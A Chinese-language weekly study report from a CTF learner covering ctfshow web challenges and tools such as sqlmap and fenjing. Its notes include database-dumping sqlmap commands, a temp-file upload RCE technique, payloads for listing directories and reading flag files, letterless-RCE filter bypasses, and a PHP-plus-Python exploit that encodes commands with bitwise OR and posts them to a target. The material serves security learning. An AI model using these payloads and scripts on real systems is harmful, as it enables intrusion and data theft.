# 完成事项

+ ### 工具方面
  
  1. 学习了vscode使用ssh远程连接kali
  
  2. 了解了sqlmap和fenjing的基础用法
  
  3. 安装并使用antsword插件绕过disable_functions
  
  4. 学习使用arjun寻找可用参数

+ ### web方面
  
  1. 完成了ctfshow29~71命令执行版块的wp
  
  2. 完成了ctfshow89~98php特性版块的wp
  
  3. 完成了ctfshow151~156文件上传板块的wp

---

# 下周待做事项

1. 学习php反序列化

2. 继续学习sql注入

3. 学习xss漏洞利用

4. 继续学习文件上传漏洞

---

# 本周学习的知识分享

+ sqlmap基本用法：
  
      python sqlmap.py -u "https://xxx/?id=1&username=1" --dbs # 查询所有数据库
      
      python sqlmap.py -u "https://xxx/?id=1&username=1" -D test --tables # 查询test数据库下所有表
      
      python sqlmap.py -u "https://xxx/?id=1&username=1" -D test --schema # 查询test数据库下所有表结构
      
      python sqlmap.py -u "https://xxx/?id=1&username=1" -D test -T f1ag_table --column # 查询test数据库中f1ag_table表的列
      
      python sqlmap.py -u "https://xxx/?id=1&username=1" -D test -T f1ag_table --dump # 获取f1ag_table表的内容
      
      python sqlmap.py -u "https://xxx/" --data "id=1" --dbs # 传输POST参数python sqlmap.py -u "https://xxx/" --all # 获取所有信息

+ fenjing基本用法：
  在windows powershell中执行
  
      pip install fenjing -i https://pypi.tuna.tsinghua.edu.cn/simple
  
  安装好fenjing后，输入
  
      python -m fenjing scan --url <你的目标url>

+ **三元运算符**是软件编程中的一种固定语法结构，其基本形式为“**条件表达式?表达式1:表达式2**”，用于简化条件判断逻辑。它通过逐级筛选数据，可在条件满足时返回第一个表达式结果，否则返回第二个表达式结果。
  例如：` $_GET?$_GET=&$_POST:'flag';`使用了三元运算符，实际意思为：若存在get参数，则get参数会取址post参数，若不存在get参数则返回字符串'flag'

+ 临时文件rce：
  首先创建html文件：
  
      <!--构造一个post上传文件的数据包，这是个上传页面，选择文件上传-->
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>POST数据包POC</title>
      </head>
      <body>
      <form action="https://b3563eed-d1ee-4823-aed8-39e3aa0f18f1.challenge.ctf.show/" method="post" enctype="multipart/form-data">
      <!--链接是当前打开的题目链接-->
          <label for="file">文件名：</label>
          <input type="file" name="file" id="file"><br>
          <input type="submit" name="submit" value="提交">
      </form>
      </body>
      </html>
  
  然后上传txt文件，例如：
  
      #!/bin/sh
      pwd
  
  同时要抓包，并传递get参数：
  
      ?c=.+/???/????????[@-[]
  
  这个等效 /tmp/phpxxxxxx
  在抓包内容中可以得到回显地址，例如：回显地址为/var/www/html
  然后同样操作上传txt文件：
  
      #!/bin/sh
      tac /var/www/html/flag.php

+ 没有过滤~，并且只要求得到数字，可以利用**linux的$(())和取反构造出36**：
  例如构造36
  首先`$(())=0`，`$((~$(())))=-1` ，`$((~$((-37))))=36`
  所以只要构造出`$((~$((-37))))`就相当于构造出来36
  其次`$(($((~$(())))))=-1`，`$(($((~$(())))$((~$(())))))=-2`
  所以可以通过在`$(())`中放入37个`$((~$(())))`得到-37，再将所得-37放入`$((~$(())))`中得到36

+ 常用构造：
  
      查看当前目录整体地址：
      c=print_r(scandir('./'));
      c=var_dump(scandir('./'));
      c=print_r(scandir(dirname('__FILE__')));
      c=print_r(scandir(current(localeconv())));
      c=$a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "<br>"; };
      
      查看根目录：
      c=print_r(scandir("/"));
      c=var_dump(scandir('/'));
      c=var_export(scandir('/'));
      c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
      
      通过单一函数读取文件：
      c=show_source('flag.php');
      c=echo file_get_contents("flag.php");    // 这个要看源代码
      c=readfile("flag.php");                // 这个要看源代码
      c=var_dump(file('flag.php'));
      c=print_r(file('flag.php'));
                                          // file函数表示把整个文件读入一个数组中
      通过fopen读取文件内容：
      fread()
      fgets()            // 一行一行的读取
      fgetc()            // 一个一个的读取
      fgetss()
      fgetcsv()
      fpassthru()
      // 这些都是与fopen函数配合使用的

+ 在 PHP 中，**intval()函数**是用来获取变量的整数值。这个函数通过指定的进制来转换变量的值，默认是十进制。如果变量是对象，使用 intval()会产生一个 E_NOTICE 错误，并返回 1
  
      int intval($var, $base) 
      $var: 需要转换成整数的变量 
      $base: 转换所使用的进制   
  
  `$base`默认值为 0, 会根据 `$var` 的格式来调整转换的进制

+ 或运rce：
  前提：没有过滤或运算符|
  首先是脚本rce_or.php:
  
      <?php
      $myfile = fopen("rce_or.txt", "w");
      $contents="";
      for ($i=0; $i < 256; $i++) { 
          for ($j=0; $j <256 ; $j++) { 
      
              if($i<16){
                  $hex_i='0'.dechex($i);
              }
              else{
                  $hex_i=dechex($i);
              }
              if($j<16){
                  $hex_j='0'.dechex($j);
              }
              else{
                  $hex_j=dechex($j);
              }
              $preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';
              if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                          echo "";
          }
      
              else{
              $a='%'.$hex_i;
              $b='%'.$hex_j;
              $c=(urldecode($a)|urldecode($b));
              if (ord($c)>=32&ord($c)<=126) {
                  $contents=$contents.$c." ".$a." ".$b."\n";
              }
          }
      
      }
      }
      fwrite($myfile,$contents);
      fclose($myfile);
  
  通过以上 php 脚本生成一个 rce_or.txt，内容是上述可用字符及编码。
  大体意思就是**从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符**
  接着是exp.py脚本:
  
      # -*- coding: utf-8 -*-
      import requests
      import urllib
      from sys import *
      import os
      os.system("php rce_or.php")  #没有将php写入环境变量需手动运行
      if(len(argv)!=2):
         print("="*50)
         print('USER：python exp.py <url>')
         print("eg：  python exp.py http://ctf.show/")
         print("="*50)
         exit(0)
      url=argv[1]
      def action(arg):
         s1=""
         s2=""
         for i in arg:
             f=open("rce_or.txt","r")
             while True:
                 t=f.readline()
                 if t=="":
                     break
                 if t[0]==i:
                     #print(i)
                     s1+=t[2:5]
                     s2+=t[6:9]
                     break
             f.close()
         output="(\""+s1+"\"|\""+s2+"\")"
         return(output)
      
      while True:
         param=action(input("\n[+] your function：") )+action(input("[+] your command："))
         data={
             'c':urllib.parse.unquote(param)
             }
         r=requests.post(url,data=data)
         print("\n[*] result:\n"+r.text)
  
  用法是`python exp.py <url>`
  先运行第一个php脚本得到rce_or.txt,接着运行第二个python脚本,输入相关命令得到flag

+ **command > /dev/null 2>&1**：**输出重定向**，会将标准输出和标准错误都重定向到 /dev/null ，即不回显

+ ; //分号 
  | //只执行后面那条命令 
  
  || //只执行前面那条命令 
  
  & //两条命令都会执行 
  
  && //两条命令都会执行

+ grep：
  
      grep [选项] "搜索模式" 文件名
      例如：grep "hello" example.txt         # 搜索包含"hello"的行

+ 无字母rce但没有过滤数字：
  
  用八进制数字编码，例如：
  
      cat flag.php
      $'\164\141\143' $'\146\154\141\147\56\160\150\160'
  
  用base64，例如：
  
      /bin/base64 flag.php
      /???/????64 ????.???
      得到的编码进行base64解码即可
  
  用文件压缩，例如：
  
      /usr/bin/bzip2 flag.php
      /???/???/????2 ????.???
      然后访问flag.php.bz2得到压缩包，解压即可

---

# 本周学习总结

web方向的学习不能只注重单方面的，应该结合起来学习，例如在命令执行有多处可以看到文件包含的做法，在下周的学习需要对web所有类型有一个大概的了解了


